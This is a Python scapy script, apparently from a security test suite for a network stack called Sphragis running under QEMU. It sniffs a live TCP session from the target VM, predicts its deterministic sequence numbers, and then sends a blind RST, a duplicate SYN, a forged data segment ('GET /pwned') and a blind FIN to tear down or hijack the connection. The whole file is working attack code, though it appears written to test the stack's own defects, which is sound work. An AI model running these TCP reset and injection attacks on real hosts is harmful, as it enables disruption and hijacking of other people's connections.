#!/usr/bin/env python3
"""
fuzz_tcp.py — ATTACK-NET-009, 010, 011, 019, 022

Exercises TCP state-machine issues. Requires QEMU tap bridge + root.
Assumes Sphragis has an established TCP connection we can interfere with
(e.g. via the browser demo). Scripts listen for any outgoing segment to
snapshot the sequence numbers.

Key insight: `snd_nxt = 1000 + pcb_id * 997` is deterministic, so once
we see one segment on the wire we can predict the rest. Slot 0 (legacy)
starts at 1000 then adds 1 per SYN/FIN.
"""

import sys
import time

try:
    from scapy.all import (
        Ether, IP, TCP, sniff, sendp, conf, Raw
    )
except ImportError:
    print("scapy required", file=sys.stderr)
    sys.exit(1)


IFACE = "tap0"
VICTIM_IP = "10.0.2.15"
VICTIM_MAC = "52:54:00:12:34:56"  # default QEMU
SRC_MAC = "02:aa:bb:cc:dd:03"

# Tuple we discover from sniffing
observed = {}


def on_pkt(p):
    if not (IP in p and TCP in p): return
    if p[IP].src != VICTIM_IP: return
    t = p[TCP]
    observed["src_port"] = t.sport
    observed["dst_port"] = t.dport
    observed["seq_victim_sent"] = t.seq
    observed["ack_victim_sent"] = t.ack
    observed["remote_ip"] = p[IP].dst
    print(f"    observed: victim {VICTIM_IP}:{t.sport} -> peer:{t.dport} "
          f"seq={t.seq} ack={t.ack} flags={t.flags}")


def wait_for_session(timeout=30):
    print("[*] Sniffing for an outgoing TCP segment from Sphragis...")
    sniff(iface=IFACE, filter=f"tcp and src host {VICTIM_IP}", prn=on_pkt,
          store=False, timeout=timeout,
          stop_filter=lambda _: "seq_victim_sent" in observed)


def mk(flags, seq, ack, payload=b""):
    ip = IP(src=observed["remote_ip"], dst=VICTIM_IP)
    tcp = TCP(sport=observed["dst_port"], dport=observed["src_port"],
              flags=flags, seq=seq, ack=ack, window=8192)
    p = Ether(dst=VICTIM_MAC, src=SRC_MAC) / ip / tcp / Raw(load=payload)
    return p


def attack_010_blind_rst():
    # RFC 5961: RST must seq==rcv_nxt. Sphragis accepts any.
    # Guess rcv_nxt: Sphragis's rcv_nxt == our last-seen `seq_victim_sent + payload_len`
    # but since we aren't tracking payload, try seq=ack_victim_sent.
    p = mk("R", seq=observed["ack_victim_sent"], ack=0)
    sendp(p, iface=IFACE, verbose=False)
    print("[ATTACK-NET-010] SENT blind RST")


def attack_011_inject_data():
    payload = b"GET /pwned HTTP/1.0\r\n\r\n"
    seq = observed["ack_victim_sent"]  # exact next byte victim expects
    ack = observed["seq_victim_sent"] + 1
    p = mk("PA", seq=seq, ack=ack, payload=payload)
    sendp(p, iface=IFACE, verbose=False)
    print(f"[ATTACK-NET-011] SENT injected data ({len(payload)}B) at seq={seq}")


def attack_022_blind_fin():
    p = mk("FA", seq=observed["ack_victim_sent"], ack=observed["seq_victim_sent"] + 1)
    sendp(p, iface=IFACE, verbose=False)
    print("[ATTACK-NET-022] SENT blind FIN")


def attack_019_dup_syn():
    p = mk("S", seq=observed["ack_victim_sent"] - 1, ack=0)
    sendp(p, iface=IFACE, verbose=False)
    print("[ATTACK-NET-019] SENT duplicate SYN while ESTABLISHED")


def attack_009_isn_predict():
    print("[ATTACK-NET-009] Predicted ISN: PCB 0 starts at 1000+0*997 = 1000")
    print("                 PCB 1: 1997, PCB 2: 2994, ...")
    print("                 No sniff needed — attacker can SYN-flood at blind seq values.")


if __name__ == "__main__":
    conf.verb = 0
    attack_009_isn_predict()
    wait_for_session(timeout=30)
    if "src_port" not in observed:
        print("No session seen; start the Sphragis browser demo and rerun.")
        sys.exit(1)
    attack_010_blind_rst()
    time.sleep(0.5)
    attack_019_dup_syn()
    time.sleep(0.5)
    attack_011_inject_data()
    time.sleep(0.5)
    attack_022_blind_fin()
